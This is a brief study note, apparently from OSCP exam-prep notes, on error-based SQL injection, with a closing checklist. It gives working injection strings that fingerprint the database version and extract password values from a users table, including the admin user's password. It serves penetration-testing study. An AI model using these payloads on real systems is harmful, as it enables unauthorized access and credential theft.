# SQLi — Error-Based

Use when the application exposes SQL/database errors and those errors can reveal values from attacker-controlled queries.

## Basic progression

### Fingerprint the database

```sql
' or 1=1 in (select @@version) -- //
```

MySQL accepts both `version()` and `@@version`.

### Query one column at a time

A query that returns multiple columns may fail when the application/error context expects a single value:

```sql
' OR 1=1 in (SELECT * FROM users) -- //
```

Try a single interesting column instead:

```sql
' or 1=1 in (SELECT password FROM users) -- //
```

### Target a specific record

```sql
' or 1=1 in (SELECT password FROM users WHERE username='admin') -- //
```

## OSCP checklist

- Add a quote and observe whether a SQL error appears.
- Use the error path to fingerprint the DB/version.
- Enumerate one value/column at a time if multi-column output fails.
- Add `WHERE` clauses to associate hashes/values with a specific user.
- If query results are rendered normally in the page, also test [[SQLi — UNION-Based]].
